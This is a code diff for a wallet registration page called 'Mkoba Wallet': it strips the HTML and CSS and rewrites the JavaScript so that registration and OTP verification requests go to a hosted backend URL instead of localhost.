@@ -1,143 +1,72 @@
-CTYPE html>
-
-
-    
-    Mkoba Wallet - Register
-    
-    
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .register-container {
-            background: white;
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        }
-        h2 {
-            margin-bottom: 20px;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 5px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        button {
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        .error-message {
-            color: red;
-            margin-top: 10px;
-        }
-        .success-message {
-            color: green;
-            margin-top: 10px;
-        }
-    
-
-
-
-
-    Mkoba Wallet Registration
-    
-        
-        
-        
-        
-         I agree to the terms
-        Register
-        
-        
-    
-
-    
-        
-        
-        Verify OTP
-    
-
-
+<script>
+const BACKEND_URL = "https://repo-1red-jipate-bonus.onrender.com";
 
 document.addEventListener('DOMContentLoaded', () => {
+
     const form = document.getElementById('registerForm');
     const errorMsg = document.getElementById('errorMsg');
     const successMsg = document.getElementById('successMsg');
     const otpSection = document.getElementById('otpSection');
-    const otpDisplay = document.getElementById('otpDisplay');
     const otpInput = document.getElementById('otpInput');
 
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
+
         errorMsg.textContent = '';
         successMsg.textContent = '';
-        
+
         const formData = new FormData(form);
-        const terms = formData.get('terms');
-        
-        if (!terms) {
-            errorMsg.textContent = 'You must agree to the terms.';
-            return;
-        }
 
         try {
-            const response = await fetch(form.action, {
+            const response = await fetch(`${BACKEND_URL}/register`, {
                 method: 'POST',
                 body: formData
             });
 
+            const data = await response.json();
+
             if (!response.ok) {
-                const errorDetails = await response.json();
-                errorMsg.textContent = errorDetails.detail || 'Registration failed.';
+                errorMsg.textContent = data.detail || 'Registration failed.';
                 return;
             }
 
-            otpDisplay.textContent = 'OTP has been sent to your phone.';
+            successMsg.textContent = 'OTP sent successfully.';
             otpSection.style.display = 'block';
 
         } catch (error) {
-            console.error('Error:', error);
-            errorMsg.textContent = 'An error occurred. Please try again later.';
+            errorMsg.textContent = 'Server error. Please try again.';
         }
     });
 
     document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
+
+        errorMsg.textContent = '';
+        successMsg.textContent = '';
+
         const enteredOtp = otpInput.value.trim();
+        const username = document.getElementById('username').value.trim();
+
         if (!enteredOtp) {
             errorMsg.textContent = 'Enter OTP.';
             return;
         }
 
         try {
-            const response = await fetch('http://localhost:8000/verify-otp', {
+            const response = await fetch(`${BACKEND_URL}/verify-otp`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
                 body: new URLSearchParams({
-                    username: document.getElementById('username').value.trim(),
+                    username: username,
                     otp: enteredOtp
                 })
             });
 
+            const data = await response.json();
+
             if (!response.ok) {
-                const errorDetails = await response.json();
-                errorMsg.textContent = errorDetails.detail || 'OTP verification failed.';
+                errorMsg.textContent = data.detail || 'OTP verification failed.';
                 return;
             }
 
@@ -149,8 +78,9 @@ document.addEventListener('DOMContentLoaded', () => {
             }, 1500);
 
         } catch (error) {
-            console.error('Error:', error);
-            errorMsg.textContent = 'An error occurred. Please try again later.';
+            errorMsg.textContent = 'Server error. Please try again.';
         }
     });
+
 });
+</script>
